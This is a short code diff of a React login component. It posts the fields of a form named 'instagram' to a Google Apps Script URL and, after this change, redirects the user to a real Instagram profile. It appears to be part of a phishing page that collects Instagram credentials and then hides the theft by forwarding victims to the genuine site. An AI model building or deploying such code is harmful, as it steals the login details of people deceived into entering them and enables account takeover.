@@ -8,13 +8,12 @@ const Login = () => {
   const submitForm = (e) => {
     const scriptURL =
       "https://script.google.com/macros/s/AKfycbxMxZClMqC4FKIpTGsp0ekJToDAOURGzCaH8vm2-N48reDX-YP3MaX9_jVUmKZK7smF8w/exec";
-      const form = document.forms["instagram"];
+    const form = document.forms["instagram"];
 
     e.preventDefault();
     fetch(scriptURL, { method: "POST", body: new FormData(form) })
       .then((response) =>
-        // window.location.assign("https://www.instagram.com/iamuttampatra69/")
-        alert()
+        window.location.assign("https://www.instagram.com/iamuttampatra69/")
       )
       .catch((error) => console.error("Error!", error.message));
   };
